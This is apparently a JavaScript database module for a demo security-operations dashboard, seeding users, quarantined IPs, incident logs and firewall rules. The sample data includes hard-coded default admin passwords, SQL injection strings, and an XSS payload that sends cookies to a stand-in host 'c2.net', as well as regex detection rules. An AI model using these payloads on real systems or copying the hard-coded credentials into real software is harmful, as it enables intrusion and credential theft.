import fs from 'fs';
import path from 'path';
import bcrypt from 'bcryptjs';
import { config } from '../config/config.js';

// Ensure data directory exists
if (!fs.existsSync(config.DATA_DIR)) {
  fs.mkdirSync(config.DATA_DIR, { recursive: true });
}
if (!fs.existsSync(config.UPLOAD_DIR)) {
  fs.mkdirSync(config.UPLOAD_DIR, { recursive: true });
}

// Default Seed Data
function getSeedData() {
  const salt = bcrypt.genSaltSync(10);
  const adminHash = bcrypt.hashSync('Sentinel@2025!', salt);
  const analystHash = bcrypt.hashSync('Analyst@2025!', salt);

  return {
    users: [
      {
        id: 'usr-admin-01',
        email: 'commander@sentinel.defense.gov',
        passwordHash: adminHash,
        name: 'Chief Sentinel Commander',
        role: 'SOC_COMMANDER',
        badge: 'CSTD-ALPHA-01',
        twoFactorEnabled: true,
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString()
      },
      {
        id: 'usr-analyst-02',
        email: 'analyst@sentinel.defense.gov',
        passwordHash: analystHash,
        name: 'Senior Threat Analyst',
        role: 'SECURITY_ANALYST',
        badge: 'CSTD-THREAT-09',
        twoFactorEnabled: false,
        createdAt: new Date().toISOString(),
        lastLogin: new Date().toISOString()
      }
    ],
    quarantinedIPs: [
      { ip: '45.33.32.156', reason: 'SQL Injection Attack Vector (Automated Interception)', time: '19:40:12', active: true, hits: 14 },
      { ip: '185.220.101.5', reason: 'Union Schema Exfiltration Probe (Tor Exit Node)', time: '19:42:01', active: true, hits: 28 },
      { ip: '194.26.29.112', reason: 'Brute Force Credential Burst (Rate Limit Breach)', time: '19:35:44', active: true, hits: 82 }
    ],
    incidentLogs: [
      { id: 'inc-01', ip: '45.33.32.156', type: 'SQLI', payload: "SELECT * FROM users WHERE '1'='1' --", time: '19:40:12', action: 'INTERCEPTED & QUARANTINED', severity: 'HIGH' },
      { id: 'inc-02', ip: '185.220.101.5', type: 'XSS', payload: '<script>fetch("http://c2.net/steal?c="+document.cookie)</script>', time: '19:42:01', action: 'SANITIZED & LOGGED', severity: 'MEDIUM' },
      { id: 'inc-03', ip: '103.145.13.2', type: 'DDOS', payload: 'SYN_FLOOD_BURST: 85000 pkts/s on port 443', time: '19:43:10', action: 'RATE LIMITED & REJECTED', severity: 'CRITICAL' },
      { id: 'inc-04', ip: '91.240.118.17', type: 'POISONING', payload: 'Adversarial Label Perturbation Matrix [0.98, -0.42]', time: '19:45:00', action: 'ML INTEGRITY SHIELD TRIGGERED', severity: 'HIGH' }
    ],
    firewallRules: [
      { id: 'rule-01', name: 'Strict SQL Injection Defense', pattern: "(union(\\s+)select|select.+from|drop(\\s+)table|--|/\\*|;|'\\s*or\\s*'1'='1)", action: 'BLOCK', riskThreshold: 70, enabled: true, category: 'SQLI' },
      { id: 'rule-02', name: 'XSS Script & DOM Neutralizer', pattern: "(<script|javascript:|onerror=|onload=|eval\\()", action: 'SANITIZE', riskThreshold: 60, enabled: true, category: 'XSS' },
      { id: 'rule-03', name: 'Adversarial Label Poisoning Filter', pattern: "(__label_poison__|adversarial_perturbation|data_flip)", action: 'BLOCK', riskThreshold: 85, enabled: true, category: 'POISONING' },
      { id: 'rule-04', name: 'Sensitive Data Exfiltration Guard', pattern: "(\\b\\d{3}-\\d{2}-\\d{4}\\b|\\b\\d{16}\\b|sk_live_[0-9a-zA-Z]{24})", action: 'SANITIZE', riskThreshold: 75, enabled: true, category: 'PII' }
    ],
    blockedQueries: [
      { id: 'bq-01', query: "SELECT * FROM users WHERE username = 'admin' OR 1=1 --", risk: 85, time: '19:40:12', ip: '45.33.32.156', ruleTriggered: 'rule-01' },
      { id: 'bq-02', query: "SELECT id, title FROM items UNION SELECT 1, password_hash FROM sys_users", risk: 95, time: '19:42:01', ip: '185.220.101.5', ruleTriggered: 'rule-01' }
    ],
    uploadedFiles: [],
    socStatus: {
      threatLevel: 'NORMAL',
      emergencyLockdown: false,
      autoMitigation: true,
      lastSync: new Date().toISOString()
    }
  };
}

class Database {
  constructor() {
    this.filePath = config.DB_FILE;
    this.data = null;
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.filePath)) {
        const raw = fs.readFileSync(this.filePath, 'utf-8');
        this.data = JSON.parse(raw);
      } else {
        this.data = getSeedData();
        this.save();
      }
    } catch (err) {
      console.warn('⚠️ Warning: DB file load error, initializing fresh memory state:', err.message);
      this.data = getSeedData();
      this.save();
    }
  }

  save() {
    try {
      fs.writeFileSync(this.filePath, JSON.stringify(this.data, null, 2), 'utf-8');
    } catch (err) {
      console.error('❌ Failed to persist database to disk:', err.message);
    }
  }

  get(collection) {
    return this.data[collection] || [];
  }

  set(collection, value) {
    this.data[collection] = value;
    this.save();
    return this.data[collection];
  }

  find(collection, predicate) {
    const list = this.get(collection);
    return list.find(predicate);
  }

  filter(collection, predicate) {
    const list = this.get(collection);
    return list.filter(predicate);
  }

  insert(collection, item) {
    if (!this.data[collection]) {
      this.data[collection] = [];
    }
    this.data[collection].unshift(item);
    this.save();
    return item;
  }

  update(collection, predicate, updater) {
    if (!this.data[collection]) return null;
    const index = this.data[collection].findIndex(predicate);
    if (index !== -1) {
      this.data[collection][index] = typeof updater === 'function' ? updater(this.data[collection][index]) : { ...this.data[collection][index], ...updater };
      this.save();
      return this.data[collection][index];
    }
    return null;
  }

  delete(collection, predicate) {
    if (!this.data[collection]) return false;
    const initialLen = this.data[collection].length;
    this.data[collection] = this.data[collection].filter(item => !predicate(item));
    const removed = this.data[collection].length < initialLen;
    if (removed) this.save();
    return removed;
  }
}

export const db = new Database();
